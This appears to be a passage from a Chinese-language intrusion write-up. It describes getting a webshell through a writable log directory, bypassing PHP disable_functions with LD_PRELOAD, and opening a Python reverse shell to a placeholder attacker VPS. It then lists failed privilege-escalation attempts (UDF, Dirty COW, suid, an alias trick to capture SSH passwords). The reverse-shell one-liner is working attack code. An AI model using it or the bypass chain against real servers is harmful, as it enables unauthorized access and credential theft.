## Getshell + Bypass disable\_functions

bypass disable\_functions需要配合一些自己上传的文件，所以先想办法getshell，既然当前目录不能连不能写，可能是设置了权限，基友@lawliet发现/runtime/log目录可以写shell，果然是这样。

![](../Images/c77d14ac1d22bd41974f65d168eabca5.png)

shell到手，利用LD\_PRELOAD bypass disable\_functions。

  

```
https://github.com/yangyangwithgnu/bypass\\\\\\\\\\\\\\\_disablefunc\\\\\\\\\\\\\\\_via\\\\\\\\\\\\\\\_LD\\\\\\\\\\\\\\\_PRELOAD
```

![](../Images/c2c15e0524002aa8b7c8b82fa9e48949.png)

由于直径用bash -i反弹shell，命令中有 "&"导致url解析为参数，所以我选择了python直接弹shell，上传.sh脚本也可。

  

```
python python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('vpsip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);
```

## 失败的提权

udf提权（失败）：

my.conf无写权限

脏牛等exp（失败）：

gcc编译失败。

本地编译再上传，无权限运行。

suid等全部失败，本来想利用alias 修改ssh 获取root密码，想了一下不现实，当前用户是www，一是需要赋予/tmp/.ssh执行权限，二是alias只能修改当前用户，因此放弃。

到这里仔细想了一下，我们的目的到底是什么？提权后固然什么都可以干，但是或许我们要达到的目的不需要那么高的权限。
